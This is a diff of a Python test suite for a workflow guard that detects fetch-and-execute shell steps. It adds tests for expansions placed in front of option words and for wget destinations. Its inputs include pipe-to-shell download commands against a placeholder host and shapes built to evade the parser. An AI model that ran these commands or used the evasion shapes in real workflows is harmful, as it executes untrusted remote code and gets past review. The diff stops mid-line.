@@ -14,6 +14,10 @@ shell may give it; this is the same rule for every other expansion, in four part
  3. A tilde alone (`~`, `~+`, `~-`, `~1`) is a value, as `$X` is: `HOME=-c; sh ~ 'P'` runs `P`.
  4. wget handed a whole-word expansion may be handed `-O-`: where its stdout is piped the stream view is added, and
     the file view stays `main`'s.
+ 5. An expansion in FRONT of an option word may print nothing (#3042): `sh $X-c 'P'` runs `P` with `X` unset, where
+    `main` read `$X-c` as the FILE. Such a word is read both ways (`workflow_option_words.uncovered`) -- in a shell's
+    words, its program on stdin and a fetcher's words -- under a switch of its own (`as_main`): `main` has had rule
+    1 to 4 on since #2889 merged, so where this reading answered the job's floor reads `main`'s whole answer first.
 
 Every new reading stands BESIDE `main`'s, never instead of it (`TestBesideNeverInstead`) -- and since the guard's
 readers, handed more words, may choose a quieter reading of a step, the JOB is read both ways wherever the rule
@@ -33,9 +37,11 @@ been since #2344. On the 13 grids behind these pins (14,322 rows) 507 rows that 
 that run nothing: 937 of those are steps that fail where they stand (the shell takes the program text for a FILE's
 name) and 139 of the rest are the `X=s` rows, whose string is a positional parameter. `TestThePrice` pins the shapes.
 Left for other issues, pinned in `TestWhatStays`: the `$CMD` command word whose cluster is not its first word
-(#2671, #2900), three shapes of wget (#3033, #3034, #3035), the first pass alone, and four families a probe of the
-rule's own nouns found open on `main` as well: an expansion in FRONT of a written option word (#3042), a substitution
-in the string's slot (#3043), the value of a written `-O` (#3044), and a stream read through a `<(...)` (#3045).
+(#2671, #2900), two shapes of wget (#3033, #3035), the first pass alone, and two families a probe of the rule's
+own nouns found open on `main` as well: a substitution in the string's slot (#3043) and the value of a written `-O`
+(#3044). #3034's fail-closed file view also reports the two process-substitution rows filed as #3045; their direct
+stream binding remains a more precise reading. The fourth family, an expansion in FRONT of a written option word
+(#3042), is rule 5.
 """
 import ast
 import contextlib
@@ -464,13 +470,345 @@ class TestAFetcherHandedAnExpansion(unittest.TestCase):
         self.assertEqual(BOTH, marks("X=-q\nwget $X %s\nsh i.sh\n" % URL))
         self.assertEqual(BOTH, marks("X=-q\nwget $X %s -O tool\nsh tool\n" % URL))
         self.assertEqual({BOTH}, under("wget $(echo -qO-) %s | cat\nsh i.sh\n" % URL))
-        # Nothing piped, nothing run: no report. `curl` beside an expansion is unread, as it was.
-        self.assertEqual(CLEAN, marks("wget $OPTS %s\n" % URL))
+        # #3034: a whole-word expansion beside a written URL may instead name the destination, so
+        # the file view is unread even when nothing is piped or run.
+        self.assertEqual(BOTH, marks("wget $OPTS %s\n" % URL))
         self.assertEqual(CLEAN, marks("wget -q \"$A\" \"$B\"\n"))
         # Two URLs written out hand no option on: wget writes two files and the pipe is empty. Truth for these
         # three and for curl's row: fetched only.
         self.assertEqual(CLEAN, marks("wget %s %s2 | sh\n" % (URL, URL)))
         self.assertEqual(BOTH, marks("curl $OPTS %s\n" % URL))
+
+    def test_3034_a_whole_word_expansion_may_name_wgets_destination(self):
+        # Each download lands in `tool` under all sixteen truth runners. The guard used to keep the
+        # written URL as wget's one operand and therefore bind only its basename, `i.sh`.
+        rows = (
+            "X='-O tool'\nwget $X %s\nsh tool\n" % URL,
+            'X=-Otool\nwget "$X" %s\nsh tool\n' % URL,
+            "X=-O\nwget $X tool %s\nsh tool\n" % URL,
+        )
+        for row in rows:
+            with self.subTest(row=row.splitlines()[0]):
+                self.assertEqual(BOTH, marks(row))
+        self.assertEqual({BOTH}, under("wget $(echo -O tool) %s\nsh tool\n" % URL))
+
+        # The checksum names the basename that wget does not write. It stops the ten `-e` truth
+        # runs and the remaining six run `tool`; it must not bless the unresolved transfer.
+        checked = ("X='-O tool'\nwget $X %s\n" % URL
+                   + 'echo "%s  i.sh" | sha256sum -c -\nsh tool\n' % ("0" * 64))
+        self.assertEqual(BOTH, marks(checked))
+
+        # #3034's expansion reading stands beside the pre-#2889 file view, never in its place.
+        with words.as_before():
+            self.assertEqual(CLEAN, marks(rows[0]))
+
+    def test_3034_controls_keep_their_readings(self):
+        # curl already fails closed on the extra operand; wget's benign option still binds the
+        # URL basename. With no written URL, two unknown operands remain the bounded clean case.
+        self.assertEqual(BOTH, marks("X='-o tool'\ncurl $X %s\nsh tool\n" % URL))
+        self.assertEqual(BOTH, marks("X=-q\nwget $X %s\nsh i.sh\n" % URL))
+        self.assertEqual(CLEAN, marks('wget -q "$A" "$B"\n'))
+
+
+class TestAnExpansionInFrontOfAnOptionWord(unittest.TestCase):
+    """Rule 5 (#3042). `sh $X-c 'P'` runs `P` with `X` unset, as `sh -c 'P'` does, and read CLEAN on `main`, which took
+    `$X-c` for the FILE the shell runs and `P` for that FILE's parameter. A word whose expansions in FRONT of an option
+    word may print nothing IS that option word then (`workflow_option_words.uncovered`), so the rule reads the words
+    that way too, after reading them as written -- in the search for the `-c` string, the second walk's, the search for
+    a value, the second walk's program on stdin and a fetcher's words -- and hands on the step's own words alone; and
+    where it answered, the job reads `main`'s whole answer first (`as_main`). `SHELL` is `sh`, then `bash`."""
+
+    def assertRead(self, expected, *rows):
+        for row in rows:
+            for shell in ("sh", "bash") if "SHELL" in row else ("",):
+                for digit in "0c" if "$(" in row or "`" in row else "0":
+                    text = row.replace("SHELL", shell)
+                    with self.subTest(text=text, digit=digit), nonce(digit):
+                        self.assertEqual(expected, readings(text))
+
+    def test_the_issues_rows(self):
+        # #3042's shapes. Truth: runs, all sixteen, every one.
+        self.assertRead(RULED, *(row % P for row in (
+            "SHELL $X-c %s\n", "SHELL $X-ec %s\n", "SHELL ${X}-c %s\n", "SHELL ${X:-}-c %s\n", "SHELL $X$Y-c %s\n",
+            'SHELL "$X"-c %s\n', "X=; SHELL $X-c %s\n", "SHELL $(true)-c %s\n", "SHELL $X+c %s\n", "SHELL -c $X-e %s\n",
+            "sudo SHELL $X-c %s\n", "SHELL $X-c %s <<'EOF3042'\necho body\nEOF3042\n")))
+        self.assertRead(RULED, "wget $X-qO- %s | sh\n" % URL, "wget ${X}-O- %s | sh\n" % URL)
+
+    def test_every_expansion_that_may_print_nothing(self):
+        # Truth: runs, all sixteen, every one -- but `${!X}` (bash 3.2.57 alone runs it), `${X:0:0}` and `${X/a/b}`
+        # (bash, not dash) and `$-` (dash without `-e` alone): each is read as the others are, as the shell is not known.
+        self.assertRead(RULED, *("SHELL %s-c %s\n" % (front, P) for front in (
+            "${X-}", "${X:+y}", "${X#*}", "${X%%*}", '"${X}"', "$1", "$@", '"$@"', "$*", '"$*"', "`true`", "$(printf '')",
+            '"$(true)"', "${X:-${Y:-}}", "$(true)$X", "${!X}", "$-")))
+        self.assertRead(RULED, "bash ${X:0:0}-c %s\n" % P, "bash ${X/a/b}-c %s\n" % P, "X=' '; SHELL $X-c %s\n" % P,
+                        "X='-e '; SHELL $X-c %s\n" % P, 'SHELL "$X-c" %s\n' % P, 'SHELL "${X}-c" %s\n' % P)
+        # What stands behind them is read as it is in any option word: a marker or a reference there may print a
+        # letter too. Truth: runs, all sixteen.
+        self.assertRead(RULED, *("SHELL %s %s\n" % (word, P) for word in (
+            "$X-c$(echo e)", "$X-$(echo c)", "$(true)-c$(true)", "${X:-$(true)}-c", "$X-c$Y")))
+
+    def test_the_option_word_behind_them(self):
+        # Any cluster carrying `c`, of either sign, one that owes a NAME, and one before the `-c`. Truth: runs, all sixteen.
+        self.assertRead(RULED, *("SHELL $X%s %s\n" % (word, P) for word in (
+            "-xc", "-ce", "-cx", "+xc", "-ic", "-lc", "+ec", "-oc errexit", "-co errexit", "-c -e")))
+
+    def test_where_the_word_stands(self):
+        # Behind an option, a long option, a value's name, the cluster; two of them; past a FILE that runs its
+        # parameter -- where the second walk alone reads on past a word the shell would refuse (`-K`); in front of a
+        # value, and of a word that may vanish (`$Y`) or a FILE the value's search skips. Truth: runs, all sixteen.
+        self.assertRead(RULED, *(row % P for row in (
+            "SHELL -e $X-c %s\n", "SHELL -o errexit $X-c %s\n", "SHELL -c $X-e $Y-x %s\n", "SHELL -c $X+e %s\n",
+            "SHELL $X-e $Y-c %s\n", "SHELL $X-c $Y-e %s\n", "printf 'eval \"$2\"' > ./a; SHELL ./a $X-c %s\n",
+            "SHELL -s $X-c %s\n", "Y=-c; SHELL $X-e $Y %s\n", "Y=-c; SHELL $X-o errexit $Y %s\n", "Y=-c\nSHELL $X-e $Y %s\n",
+            "bash --norc $X-c %s\n", "bash --rcfile /dev/null $X-c %s\n", "SHELL $X-c $Y %s\n",
+            "Y=-c; bash --rcfile f $X-e $Y %s\n", "printf 'eval \"$3\"' > ./a; SHELL ./a $X-c -K %s\n")))
+
+    def test_the_command_around_the_shell(self):
+        # Truth: runs, all sixteen, every one -- but `exec -a`, which dash's `exec` refuses.
+        self.assertRead(RULED, *(row % P for row in (
+            "env SHELL $X-c %s\n", "exec SHELL $X-c %s\n", "command SHELL $X-c %s\n", "nice SHELL $X-c %s\n", "/bin/SHELL $X-c %s\n",
+            "/usr/bin/env SHELL $X-c %s\n", "CMD=SHELL; $CMD $X-c %s\n", "${CMD:-SHELL} $X-c %s\n", "( SHELL $X-c %s )\n",
+            "if SHELL $X-c %s; then :; fi\n", "true && SHELL $X-c %s\n", "dash $X-c %s\n", "nohup SHELL $X-c %s\n",
+            "time SHELL $X-c %s\n", "exec -a x SHELL $X-c %s\n", "echo x | xargs SHELL $X-c %s\n")))
+        self.assertRead(RULED, *(row % PIPE for row in (
+            "eval 'SHELL $X-c \"%s\"'\n", "bash -c 'SHELL $X-c \"%s\"'\n", "echo 'SHELL $X-c \"%s\"' | sh\n",
+            "sh <<'EOF3042'\nSHELL $X-c '%s'\nEOF3042\n")))
+        # A wrapper's own option word in front of the shell is the wrapper's, and `main` reports those steps as it did.
+        # Truth: runs, all sixteen.
+        self.assertRead(EITHER, "sudo $X-E SHELL -c %s\n" % P, "env $X-i SHELL -c %s\n" % P)
+
+    def test_a_fetchers_option_word(self):
+        # wget writes the URL's file unless told otherwise, and `$X-qO-` tells it to stream with `X` unset: the
+        # transfer the words then name is read, and its stream beside the file `main` read it into. Truth: runs, all
+        # sixteen, every one -- but `bash <(...)`, which dash cannot read.
+        self.assertRead(RULED, *(row % URL for row in (
+            "wget $X-qO- %s | sh\n", "wget ${X}-O- %s | sh\n", "wget $X-O- %s | bash\n", "wget $X-O - %s | sh\n",
+            "wget $X-qO - %s | sh\n", "wget -q $X-O- %s | sh\n", "wget $X--output-document=- %s | sh\n",
+            "wget $(true)-qO- %s | sh\n", 'wget "$X"-qO- %s | sh\n', "wget $X-qO- %s | tee f | sh\n",
+            "wget $X-qO- %s | cat | sh\n", "bash <(wget $X-qO- %s)\n",
+            "wget $X-O f %s && sh f\n", "wget $X-qO f %s && sh f\n", "wget $X-Of %s && sh f\n", "wget -O f $X-qO- %s | sh\n")))
+        # ... and the stream `main` read stays beside a file the words read so name. Truth: fetched only with `X` unset
+        # (the last `-O` wins); with `X=x` the transfer streams, `main`'s reading.
+        self.assertRead(EITHER, "wget -qO- $X-O f %s | sh\n" % URL)
+        # Where the words read so name no URL (`-l` takes the rest of `-linux.tgz`), `main`'s transfer is the one: and
+        # nothing runs these. Truth: fetched only, every one.
+        self.assertRead((CLEAN[0],) * 3, "wget ${BASE}-linux.tgz\n", "wget $BASE-linux.tgz | sh\n", "wget $X-O f %s\n" % URL,
+                        "wget $X-i urls.txt && sh i.sh\n")
+        # curl beside such a word is unread on `main`, and reported; the rule reads the transfer too. Truth: runs. And
+        # where the rule's reading alone reads nothing piped, the floor keeps `main`'s report. Truth: fetched only.
+        self.assertRead(EITHER, "curl $X-o f %s && sh f\n" % URL, "curl $X-o f %s; sh f\n" % URL)
+        self.assertRead(FLOOR, "curl $X-o f %s | sh\n" % URL)
+
+    def test_what_is_no_such_word(self):
+        # An expansion that always prints -- a length, a status, a count, an arithmetic, a tilde -- or none in front, a
+        # word that is no option word behind them, and such a word where the options have ended. Truth: nothing runs.
+        self.assertRead((CLEAN[0],) * 3, *(row % P for row in (
+            "SHELL ${#X}-c %s\n", "SHELL $?-c %s\n", "SHELL $#-c %s\n", "SHELL $((0))-c %s\n", "SHELL ~-c %s\n",
+            "SHELL $#$X-c %s\n", "SHELL $X/-c %s\n", "SHELL -- $X-c %s\n", "SHELL -c 'true' $X-c %s\n")))
+        self.assertRead((CLEAN[0],) * 3, "SHELL -c -- $X-e\n")
+        # A `@` writes itself (a marker begins `@@shell-`): a word that begins with one and holds an expansion after
+        # it is read from its first character, as every word is, and that character is no `-`. Truth: nothing runs.
+        self.assertRead((CLEAN[0],) * 3, "SHELL @$X-c %s\n" % P)
+
+    def test_mains_whole_answer_stands_first(self):
+        # `main` has had #2889's rule on since it merged, so where #3042's reading answered, the job's floor reads
+        # `main`'s WHOLE answer first -- the job with that reading off (`as_main`), #2889's floor in it. Here the
+        # transfer the words read so name lands elsewhere, and `main` reports the step through its own transfer and
+        # #2889's string together: the rules' reading alone (the floor taken out) reads it CLEAN, as #2889's switch
+        # off does. An independent pre-review found fourteen such rows. Truth: runs, all sixteen, every one.
+        for text in ("X=x; Y=c; wget $X-O a https://example.test/install.sh || true; sh -$Y '. ./install.sh'\n", "X=x; Y=c; wget $X-qO- https://example.test/install.sh || true; sh -$Y '. ./install.sh'\n", "X=x; Y=c; wget $X-P d https://example.test/install.sh || true; sh -$Y '. ./install.sh'\n", "X=x; Y=c; wget -q $X-O a https://example.test/install.sh || true; sh -$Y '. ./install.sh'\n", "X=x; wget $X-O a https://example.test/install.sh || true; X=o; sh -c -$X errexit '. ./install.sh'\n", "X=c; wget $X-qO- https://example.test/install.sh || true; sh -$X '. ./install.sh'\n", "X=c; wget $X-O- https://example.test/install.sh || true\nsh -$X 'sh install.sh'\n", "X=c; wget -q $X-O- https://example.test/install.sh || :; bash -$X 'bash ./install.sh'\n"):
+            with self.subTest(text=text):
+                self.assertEqual(("RRRRR", "CCCCC", "CCCCC"), readings(text))
+                step = [wg.Step("step", text, None)]
+                with words.as_main():
+                    mains, strict = wg.job_defects(step), wg.fetch_exec_defects(text)
+                self.assertTrue(mains)
+                self.assertEqual(mains, wg.job_defects(step)[:len(mains)])
+                self.assertEqual(strict, wg.fetch_exec_defects(text)[:len(strict)])
+
+    def test_mains_whole_answer_keeps_its_own_floor(self):
+        # `main`'s whole answer is `main`'s job as `main` reads it: where #2889's rule answers in it too, that reading
+        # with every rule off stands first in it. #2889's floor rows with a word #3042 reads that runs nothing beside
+        # them (`sh $X-c true`): the rules' reading alone is CLEAN, and the job reports what `main` reports. Truth:
+        # nothing runs, every one, with the word or without it -- `main`'s reports, fail-closed, kept.
+        for row in (1, 3, 6):
+            text = TestWhatMainReportedIsReported.FOUND[row] + "sh $X-c true\n"
+            with self.subTest(text=text):
+                self.assertEqual(FLOOR, readings(text))
+                with words.as_main():
+                    self.assertEqual("RRRRR", marks(text)[0])
+
+    def test_the_floor_reads_mains_whole_answer_with_this_reading_off(self):
+        # The switches each reading of the job runs under, its two passes a reading: the rules', then -- where #3042's
+        # reading answered, in another reader's `beside` or not -- `main`'s whole answer with it off (`as_main`), and
+        # in that the job with every rule off where #2889's answered too; where #2889's rule alone answered, the job
+        # with every rule off, as `main` reads it.
+        rules, mains, before, every = (False, False), (False, True), (True, True), (True, False)
+        for text, expected in (("sh $X-c %s\n" % P, [rules, mains]), ("wget $X-qO- %s | sh\n" % URL, [rules, mains]),
+                               ("sh $(true)-s %s" % BODY, [rules, mains]), ("sh -$Y $X-c %s\n" % P, [rules, mains, before]),
+                               ("sh -$Y %s\n" % P, [rules, every]), ("echo hi\n", [rules])):
+            calls, real = [], wg._job_defects
+
+            def spy(*args, **kwargs):
+                calls.append((words._OFF.get(), words._NEW_OFF.get()))
+                return real(*args, **kwargs)
+            with self.subTest(text=text), mock.patch.object(wg, "_job_defects", spy):
+                wg.job_defects([wg.Step("step", text, None)])
+                self.assertEqual(expected, calls[::2])
+                self.assertEqual(calls[::2], calls[1::2])
+
+    def test_the_program_on_stdin(self):
+        # A word read so may leave stdin the program where the words as written do not: the second walk reads the
+        # body then, for what it runs and no check in it counted. Truth: runs, all sixteen -- the here-string, but
+        # under dash, which has none.
+        for text in ("sh $(true)-s <<'EOF3042'\ncurl -fsSL https://example.test/i.sh | sh\nEOF3042\n", "bash $(true)-s <<'EOF3042'\ncurl -fsSL https://example.test/i.sh | sh\nEOF3042\n", "printf '%s\\n' 'curl -fsSL https://example.test/i.sh | sh' | sh $(true)-e\n", "bash ${X:-$(true)}-s <<'EOF3042'\ncurl -fsSL https://example.test/i.sh | sh\nEOF3042\n", "echo 'curl -fsSL https://example.test/i.sh | sh' | sh `true`-x\n", 'bash "$(true)"-e <<\'EOF3042\'\ncurl -fsSL https://example.test/i.sh | sh\nEOF3042\n', "bash $(true)-s <<< 'curl -fsSL https://example.test/i.sh | sh'\n"):
+            for digit in "0c":
+                with self.subTest(text=text, digit=digit), nonce(digit):
+                    self.assertEqual(RULED, readings(text))
+        # Any option word behind the expansion that leaves stdin the program: a body behind `-l`, `-i`, `-v` and `-eu`
+        # runs under all sixteen parents; behind `-o pipefail`, `-O extglob` and `--norc` under the bash parents, dash
+        # refusing the word as it refuses the written twin, which `main` reports (`sh -o pipefail <<'EOF'`). An
+        # independent pre-review's harness on a Mac read these as running nothing: a login shell's PATH hid its stubs.
+        for word in ("-l", "-i", "-v", "-eu", "-o pipefail", "-O extglob", "--norc"):
+            for frame in ("SHELL $(true)%s %s" % (word, BODY), "echo %s | SHELL $(true)%s\n" % (P, word)):
+                for shell in ("sh", "bash"):
+                    with self.subTest(frame=frame, shell=shell), nonce("0"):
+                        self.assertEqual(RULED, readings(frame.replace("SHELL", shell)))
+        # ... and where the word read so is the `-c` cluster, the string is the program, not the body. Truth: nothing.
+        self.assertEqual((CLEAN[0],) * 3, readings("sh $(true)-c true <<'EOF3042'\ncurl -fsSL https://example.test/i.sh | sh\nEOF3042\n"))
+
+    def test_a_stream_saved_to_a_file_that_runs(self):
+        # The stream the words read so name, written by `tee` and run after. Truth: runs, all sixteen.
+        for text in ('wget $X-qO- https://example.test/i.sh | tee f > /dev/null && sh f\n', 'wget $X-qO- https://example.test/i.sh | tee f; sh f\n'):
+            with self.subTest(text=text):
+                self.assertEqual(RULED, readings(text))
+
+    def test_the_value_is_named(self):
+        # Where the words read so alone reach a value, the sentence names it.
+        found = [why for _name, why in wg.job_defects([wg.Step("step", "Y=-c; sh $X-e $Y %s\n" % P, None)])]
+        self.assertTrue(any("passes `sh` `$Y` where it reads its options" in why for why in found), found)
+
+    def test_the_words_read_so(self):
+        for text, expected in (("$X-c", "-c"), ("${X}-c", "-c"), ("${X:-}-ec", "-ec"), ("$X$Y-c", "-c"), ("$X+c", "+c"),
+                               ("${X:-${Y}}-c", "-c"), ("$@-c", "-c"), ("$1-x", "-x"), ("$--c", "-c"), ("${!X}-c", "-c"),
+                               ("$X-", "-"), ("$X--norc", "--norc"), ("$X-c$Y", "-c$Y"), ("${#+c}-x", "-x"),
+                               ("$X", None), ("$Xc", None), ("${X}c", None), ("-$X", None), ("x$X-c", None), ("$X/-c", None),
+                               ("$#-c", None), ("${#X}-c", None), ("$?-c", None), ("$$-c", None), ("~-c", None), ("*-c", None),
+                               ("$", None), ("", None), ("$#$X-c", None), ("${X:-a-b}", None)):
+            with self.subTest(text=text):
+                self.assertEqual(expected, words.uncovered(text))
+                with words.as_before():
+                    self.assertIsNone(words.uncovered(text))
+        # A lifted substitution in front, and one behind: what stands behind is the word's text, its marker in it.
+        for text, written in (("$(true)-c", "-c"), ("`true`+c", "+c"), ("$(true)$X-ec", "-ec"), ("${X:-$(true)}-c", "-c"),
+                              ("$X-c$(echo e)", "-c"), ("$(echo x)c", None)):
+            for digit in "0c":
+                with self.subTest(text=text, digit=digit), nonce(digit):
+                    found = words.uncovered(argv("sh %s P" % text)[1])
+                    self.assertEqual(written, found if found is None else words.written(found))
+                    self.assertEqual("$(echo e)" in text, found is not None and words.lifted(found))
+                    with words.as_before():
+                        self.assertIsNone(words.uncovered(argv("sh %s P" % text)[1]))
+        # The words of an argv read so: the command word as written, every other word the step's own where it is no such word.
+        words_ = argv("sh $X-c P $Y-e")
+        alt = words.uncovered_argv(words_)
+        self.assertEqual(["sh", "-c", "P", "-e"], alt)
+        self.assertEqual([True, False, True, False], [new is old for new, old in zip(alt, words_)])
+        self.assertIsNone(words.uncovered_argv(argv("sh -c P $X")))
+        self.assertIsNone(words.uncovered_argv(["$X-c", "P"]))
+        with words.as_before():
+            self.assertIsNone(words.uncovered_argv(words_))
+
+    def test_the_rule_answers_only_where_it_reads_such_a_word(self):
+        # A reading in which the rule found no such word is read once (`beside`): a word with an expansion in front of
+        # what is no option word is not one -- so a job that holds it is read as often as `main`'s.
+        for text in ("$X", "${X:-make}", "${X:-a-b}", "x$X-c", "$#-c", "-c"):
+            with self.subTest(text=text):
+                first, second = words.beside(lambda: words.uncovered(text))
+                self.assertIs(first, second)
+        self.assertEqual((None, "-c"), words.beside(lambda: words.uncovered("$X-c")))
+        # A reading inside another tells that one what it heard, and whether it was #3042's reading: the job's floor
+        # reads `main`'s whole answer wherever this reading answered, inside a reader's `beside` or not.
+        for read, heard in ((lambda: words.uncovered("$X-c"), [True, True]), (lambda: words.ruled(), [True, False]),
+                            (lambda: words.uncovered("$X"), [False, False])):
+            box = [False, False]
+            token = words._HEARD.set(box)
+            try:
+                words.beside(read)
+            finally:
+                words._HEARD.reset(token)
+            self.assertEqual(heard, box)
+
+    def test_the_floor_leaves_the_box_it_found(self):
+        # `passes` and `beside` tell the reading they run inside what they heard -- whether a rule answered, and whether
+        # it was #3042's -- in that reading's box, whatever it held, and leave the box where it was: the job's floor is
+        # read inside a reader's `beside` or none, and the reading after it starts from what IT found.
+        def job():
+            return [words.uncovered("$X-c")]            # #3042's reading answers (and so #2889's switch hears it)
+
+        def before():
+            return [words.ruled()]                      # #2889's rule alone answers
+
+        def none():
+            return [words.uncovered("$X")]              # neither
+
+        for read, heard in ((job, [True, True]), (before, [True, False]), (none, [False, False])):
+            for floor in (lambda: words.passes(read, contextlib.nullcontext), lambda: words.beside(read)):
+                self.assertIsNone(words._HEARD.get())
+                floor()
+                self.assertIsNone(words._HEARD.get())
+                for held in ([False, False], [False, True]):
+                    box = list(held)
+                    token = words._HEARD.set(box)
+                    try:
+                        floor()
+                        self.assertIs(box, words._HEARD.get())
+                    finally:
+                        words._HEARD.reset(token)
+                    self.assertEqual([heard[0] or held[0], heard[1] or held[1]], box)
+
+    def test_mains_whole_answer_is_one_reading_where_only_this_rule_answered(self):
+        # Where #3042's reading answered and #2889's rule is silent with it off, `main`'s whole answer is the job's two
+        # passes read once -- the one list `beside` hands twice -- and this reading's two passes stand beside it.
+        def read():
+            return ["new"] if words.uncovered("$X-c") else ["main"]
+
+        self.assertEqual(([["main"], ["main"]], [["new"], ["new"]]), words.passes(read, contextlib.nullcontext))
+
+    def test_beside_the_words_as_written(self):
+        # Every run of one to three of these words after `sh`: what the search for the string, the search for a value
+        # and the shell's two walks hand on with no word read so, they hand on with them -- the searches' first and in
+        # their order, the walks' among their strings -- each word they add once, and nothing but the step's own words.
+        # With either switch off (`as_before`, `as_main`), what they hand on with no word read so. (The reader hands one object for two words that
+        # are one text, so `sh $Y P P` names it twice among the value's words, as `main` did.)
+        pool = [argv("sh " + word)[1] for word in ("$X-c", "$X-e", "$(true)+c", "$X-o", "-c", "-e", "--", "errexit", "$Y", "P")]
+        readers = (ws._after_dash_c, lambda w: ws.candidates(w)[1], lambda w: ws._program_words(w) + ws._added_strings(w))
+        count = more = 0
+        for size in (1, 2, 3):
+            for tail in itertools.product(pool, repeat=size):
+                words_ = ["sh", *tail]
+                for at, read in enumerate(readers):
+                    with mock.patch.object(ws, "uncovered_argv", lambda w: None):
+                        written = read(words_)
+                    found = read(words_)
+                    for switch in (words.as_before, words.as_main):
+                        with switch():
+                            off = read(words_)
+                            with mock.patch.object(ws, "uncovered_argv", lambda w: None):
+                                self.assertEqual(list(map(id, read(words_))), list(map(id, off)), (texts(words_), at))
+                    if at < 2:
+                        self.assertEqual(list(map(id, written)), list(map(id, found[:len(written)])), (texts(words_), at))
+                        added = found[len(written):]
+                        self.assertEqual(len(added), len(set(map(id, added)) - set(map(id, written))), (texts(words_), at))
+                    else:
+                        self.assertTrue(set(map(id, written)) <= set(map(id, found)), (texts(words_), at))
+                        self.assertEqual(len(found), len(set(map(id, found))), (texts(words_), at))
+                    self.assertTrue(set(map(id, found)) - set(map(id, written)) <= set(map(id, words_)), (texts(words_), at))
+                    count, more = count + 1, more + (len(found) > len(written))
+        self.assertEqual((3 * (10 + 10 ** 2 + 10 ** 3), True), (count, more > 300))
+        # One word handed twice by the reading of the words read so (here an object the argv holds twice) is added once.
+        sh, word, value, name, program = argv("sh $W-e $Y $Z P")
+        self.assertEqual(["$Z", "P"], texts(ws.candidates([sh, word, value, name, name, program])[1]))
 
 
 class TestBesideNeverInstead(unittest.TestCase):
@@ -709,7 +1047,7 @@ class TestBesideNeverInstead(unittest.TestCase):
         # ones again), and `main`'s walk (`_refused`, a step of it) once more. A walk asked afresh, or a table not
         # kept, asks it once for every word before it: the square of the words, which no cap stands in for.
         pool = [argv("sh " + word)[1] for word in ("-c", "+c", "-x", "-o", "-co", "-$X", "+$X", "-$foo", "-$Xo", "-$(echo o)",
-                                                    "--norc", "--", "-", "errexit", "$Y", "~", "P", "-K", "./f")]
+                                                    "--norc", "--", "-", "errexit", "$Y", "~", "P", "-K", "./f", "$X-c", "$X-o", "$(true)+c")]
         rows = [[argv("sh " + word)[1] for word in tail] for size in (1, 2, 3) for tail in itertools.product(self.TURNS, repeat=size)]
         draw = random.Random(2889)                  # and long ones, drawn: the same draw on every run
         rows += [[draw.choice(pool) for _ in range(draw.randint(10, 80))] for _ in range(300)]
@@ -744,6 +1082,15 @@ class TestBesideNeverInstead(unittest.TestCase):
         self.assertEqual({("walk", "after"): 1, ("search", "after"): 3, ("search", "step"): 4},
                          {key: count for key, count in most.items() if key != ("walk", "step")})
         self.assertLessEqual(most[("walk", "step")], 2)     # `main`'s step and the walk's own, at the word it starts from
+        # The words read with each one `uncovered` (#3042) are one more search, never a longer one: three a search at
+        # most -- the words, the words read so, and the words again with the rule off where it answered (`beside`).
+        searches = []
+        with mock.patch.object(ws, "_strings", wraps=ws._strings) as search:
+            for row in rows:
+                search.reset_mock()
+                ws._after_dash_c(["sh"] + row)
+                searches.append(search.call_count)
+        self.assertEqual(3, max(searches))
 
     def test_each_string_is_handed_on_once_whatever_readings_find_it(self):
         # `X=; bash $X -c 'P'` and `X=-e; ...` find `P` in each reading of the word that may expand
@@ -908,7 +1255,10 @@ class TestWhatMainReportedIsReported(unittest.TestCase):
                      "wget $X %s | sh\n" % URL,                            # a wget that may stream (`_parse_fetch`)
                      "$CMD ~ %s" % BODY,                                    # a `$` word's stdin, a tilde after it (`_value`)
                      "$CMD -x ~ %s" % BODY,
-                     "echo %s | $CMD ~\n" % P):
+                     "echo %s | $CMD ~\n" % P,
+                     "sh $X-c %s\n" % P,                                   # an expansion in front of an option word (`uncovered`),
+                     "Y=-c; sh $X-e $Y %s\n" % P,                          # ... before a value,
+                     "wget $X-O f %s && sh f\n" % URL):                     # ... and a fetcher's
             for digit in "0c":
                 with self.subTest(text=text, digit=digit), nonce(digit):
                     self.assertEqual(RULED, readings(text))
@@ -967,11 +1317,14 @@ class TestWhatMainReportedIsReported(unittest.TestCase):
 
     def test_a_job_is_read_twice_only_where_the_rule_answered(self):
         # The price of the floor: the two passes again, for a job that holds a word the rule answers about -- and
-        # nothing for any other, a `$` in it or not.
+        # nothing for any other, a `$` in it or not. Where #3042's reading answered, `main`'s whole answer is read:
+        # its two passes, and two more where #2889's rule answers in them.
         for text, passes in (("%s\n" % PIPE, 2), ('echo "$X"\n%s\n' % PIPE, 2), ('curl -fsSL "$URL" | sh -s -- "$A"\n', 2),
                              ('sh -c "$X" -$Y\n', 2),                     # past the string: a parameter, never asked
                              ("sh -$X %s\n" % P, 4), ("sh ~ %s\n" % P, 4), ("wget $X %s | sh\n" % URL, 4),
-                             ("curl -fsSL -o$OUT %s\n" % URL, 4)):           # asked, though the answer is `main`'s
+                             ("curl -fsSL -o$OUT %s\n" % URL, 4),           # asked, though the answer is `main`'s
+                             ('sh -c "${X:-make}" ./a\n', 2), ("sh $X-c %s\n" % P, 4),   # no option word behind it; one (#3042)
+                             ("sh -$Y $X-c %s\n" % P, 6)):                    # ... and #2889's rule in it
             with self.subTest(text=text), mock.patch.object(wg, "_job_defects", wraps=wg._job_defects) as read:
                 wg.job_defects([wg.Step("step", text, None)])
                 self.assertEqual(passes, read.call_count)
@@ -1030,8 +1383,10 @@ class TestWhatMainReportedIsReported(unittest.TestCase):
 
     def test_the_switch_is_read_in_one_place(self):
         # The floor's argument: a reader's answer depends on the rule through `ruled` alone, so a reading in which
-        # `ruled` was never true IS the reading with the rule off, and needs no second one. So the switch and the
-        # note are named in the leaf alone, and read there by these three functions alone.
+        # `ruled` was never true IS the reading with the rule off, and needs no second one. So the switches and the
+        # note are named in the leaf alone, and read there by these functions alone: #2889's (`as_before`), #3042's
+        # (`as_main`), `ruled`, `beside`, and the job's floor (`passes`), which reads `main`'s whole answer with
+        # #3042's switch off wherever that reading answered.
         scripts = os.path.dirname(words.__file__)
         named = {}
         for name in sorted(os.listdir(scripts)):
@@ -1039,13 +1394,61 @@ class TestWhatMainReportedIsReported(unittest.TestCase):
                 with open(os.path.join(scripts, name), encoding="utf-8") as handle:
                     tree = ast.parse(handle.read())
                 for function in [node for node in ast.walk(tree) if isinstance(node, ast.FunctionDef)]:
-                    used = {node.id for node in ast.walk(function) if isinstance(node, ast.Name)} & {"_OFF", "_HEARD"}
